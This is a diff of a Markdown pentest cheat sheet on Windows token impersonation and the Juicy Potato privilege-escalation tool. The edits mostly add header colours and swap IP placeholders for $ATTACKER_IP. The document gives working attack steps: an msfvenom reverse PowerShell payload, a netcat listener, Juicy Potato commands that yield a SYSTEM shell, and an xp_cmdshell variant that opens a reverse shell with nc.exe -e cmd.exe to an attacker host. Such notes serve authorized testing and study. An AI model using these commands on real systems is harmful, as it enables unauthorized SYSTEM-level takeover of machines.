@@ -1,4 +1,4 @@
-#### **Tokens in Windows**
+#### <span style="color:#FFB86C">**Tokens in Windows**</span>
 Every program (process) running on Windows has a **"token"**. Think of this like an **ID card**. It shows **who is running that program** (e.g., a normal user or the SYSTEM user).
 - Some programs can **use someone else’s token** to **"pretend" to be them**. This is called **Impersonation**.
 - But to do that, the process needs **special rights**:
@@ -8,18 +8,18 @@ Every program (process) running on Windows has a **"token"**. Think of this like
 > These are powerful rights usually only given to Admins.
 ___
 
-# Juicy Potato
+# <span style="color:#FF5555">Juicy Potato</span>
 
-###  What is Juicy Potato?
+### <span style="color:#50FA7B">What is Juicy Potato?</span>
 **Juicy Potato** is a Windows local privilege escalation tool that abuses the **SeImpersonatePrivilege** to gain **SYSTEM-level access** from a low-privileged user account.
-You already have **a shell** (or Meterpreter session) on the **target machine
-#### Required Privilege:
+You already have **a shell** (or Meterpreter session) on the **target machine**.
+#### <span style="color:#FFB86C">Required Privilege:</span>
 - **SeImpersonatePrivilege** **OR**
 - **SeAssignPrimaryTokenPrivilege**
 >  **You only need one of them to work** (usually `SeImpersonatePrivilege` is enough)
 
-## Method-1 (using shell)
-#### 1️ Check User Privileges
+## <span style="color:#8BE9FD">Method-1 (using shell)</span>
+#### <span style="color:#FFB86C">1️ Check User Privileges</span>
 On the target machine, run:
 ```bash
 whoami /priv
@@ -30,7 +30,7 @@ SeImpersonatePrivilege      Enabled
 ```
 > ✅ If it's enabled, you can continue with the Juicy Potato attack!
 
-#### 2️ Download Juicy Potato
+#### <span style="color:#FFB86C">2️ Download Juicy Potato</span>
 Download the executable from:
 👉 https://github.com/ohpe/juicy-potato
 Rename it (for simplicity):
@@ -38,19 +38,19 @@ Rename it (for simplicity):
 jp.exe
 ```
 Copy it to the **victim machine**.
-#### 3️ Create a Malicious Payload
+#### <span style="color:#FFB86C">3️ Create a Malicious Payload</span>
 On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:
 ```bash
-msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
+msfvenom -p cmd/windows/reverse_powershell LHOST=$ATTACKER_IP LPORT=<Your_Port> -f raw > myshell.bat
 ```
-Replace `<Your_IP>` and `<Your_Port>` with your Kali IP and chosen port.
+Replace `$ATTACKER_IP` and `<Your_Port>` with your Kali IP and chosen port.
 Upload `myshell.bat` to the **victim machine**.
-#### 4️ Start Netcat Listener
+#### <span style="color:#FFB86C">4️ Start Netcat Listener</span>
 On your Kali machine:
 ```bash
 nc -nlvp <Your_Port>
 ```
-#### 5️ Run Juicy Potato Exploit
+#### <span style="color:#FFB86C">5️ Run Juicy Potato Exploit</span>
 On the victim machine:
 ```bash
 jp.exe -t * -p myshell.bat -l 4444
@@ -58,10 +58,10 @@ jp.exe -t * -p myshell.bat -l 4444
 - `t *` = Try all available COM types
 - `p myshell.bat` = The payload you want to run
 - `l 4444` = Port used by the fake COM server (can be any unused port)
-###  Result
+### <span style="color:#50FA7B">Result</span>
 You should now get a **reverse shell as SYSTEM** on your Netcat listener!
 
-## Method-2 (Using mssqlclient.py)
+## <span style="color:#8BE9FD">Method-2 (Using mssqlclient.py)</span>
 
 1. check the privileges 
 ```sql
@@ -69,7 +69,7 @@ SQL> xp_cmdshell whoami
 ```
 2. 
 ```sql
-SQL> xp_cmdshell C:\tools\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe YOUR_IP 8443 -e cmd.exe" -t *  
+SQL> xp_cmdshell C:\tools\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe $ATTACKER_IP 8443 -e cmd.exe" -t *  
 ```
 Explanation of flags:
 - `-l 1337` = Random COM listener port
